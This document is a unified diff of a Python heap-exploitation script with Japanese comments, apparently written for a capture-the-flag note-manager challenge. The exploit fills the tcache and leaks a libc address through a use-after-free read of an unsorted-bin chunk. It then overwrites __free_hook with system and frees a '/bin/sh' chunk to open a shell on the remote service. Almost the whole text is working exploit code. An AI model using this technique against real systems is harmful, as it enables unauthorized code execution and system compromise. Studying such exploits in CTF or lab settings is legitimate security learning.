@@ -73,26 +73,30 @@ def create_note(size, data):
   sendline_after(f, '[*] Note data: ', data)
   idx = int(readline_after(f, '[+] Chunk stored Index: ')) 
   # print("chunk idx: %d"%idx)
-  return menu(), idx
+  menu()
+  return idx
 
 
 def delete_note(idx):
   sendline(f, '2')
   sendline_after(f, 'index:', str(idx))
   # print("[+] free %d:"%idx)
-  return menu()
+  menu()
+  return 
 
 def edit_note(idx, data):
   sendline(f, '3')
   sendline_after(f, 'index: ', str(idx))
   sendline_after(f, 'data: ', data)
-  return menu()
+  menu()
+  return
 
 
 def show_note(idx):
   sendline(f, '4')
   sendline_after(f, 'index: ', str(idx))
   note = readline_after(f, ':')  
+  menu()
   return note
 
 #### plt/got, rop gadgets, symbs addrs and consts ####
@@ -108,17 +112,21 @@ logging.info(banner)
 s, f = sock(HOST, PORT)
 menu()
 
-for i in range(0x8):
-  _, X = create_note(0x100, b'X' * 0x90) # idx 0 ~ 7
+## tcache溢れ用. 
+for i in range(0x7):
+  A = create_note(0x100, b'X' * 0x90) # idx 0 ~ 6
 
-_, Z = create_note(0x100, b'/bin/sh\x00' * 0x90) # idx 8: top chunkに併合されないためののdummyチャンク
+##
+B = create_note(0x100, b'DUMMY\n') # idx 7: unsorted binにつなぐ用. 
+C = create_note(0x10, b'/bin/sh\00\n') # idx 8: top chunkに併合されないため. (あとでfree_hookでsystem呼び出しのために/bin/shを入れておく. )
 
 ## 7回同じサイズのチャンクをfreeしてtcacheを潰しておく. 
-for i in range(0x6, -1, -1):
+for i in range(0x6, -1, -1): # idx 6 ~ 0
   delete_note(i)
 
-delete_note(7) # idx 7はtcacheではなく, unsorted binにつながっている. 
-leak = show_note(7) # unsorted binに一つだけつながっている時は, main_arena->topからlibcのアドレスをリークできる. 
+delete_note(B) # B(=idx 7)はtcacheではなく, unsorted binにつながっている. 
+leak = show_note(B) # unsorted binに一つだけつながっている時は, main_arena->topからlibcのアドレスをリークできる. 
+
 ## リークからlibcのアドレス各種を算出. 
 av_top = uQ(leak.strip())
 libc_base   = av_top - ofs_av_top
@@ -129,11 +137,13 @@ dbg("av_top")
 dbg("libc_base")
 dbg("free_hook")
 dbg("addr_system")
-## UAF-> AAW primitive malloc_hook->one_gadget
+
+## UAF-> free_hookをsystem関数に差し替え. 
 edit_note(0, pQ(free_hook))
-_,X = create_note(0x100, b'X'*0x90)
-_,Y = create_note(0x100, pQ(addr_system))
+X = create_note(0x100, b'X'*0x90) # ここのデータはDUMMYでOK
+Y = create_note(0x100, pQ(addr_system)) # ここでfree_hookが返るので, system関数のアドレスを書き込み. 
+
 input('gdb?')
-sendline(f, '2')
-sendline_after(f, ':', str(Z)) # trigger free hook
+sendline(f, '2') ## Command >> 2; delete noteからfree呼び出し. 
+sendline_after(f, ':', str(C)) # /bin/shを書いておいた領域を指定すると, system("/bin/sh")と等価
 shell(s)
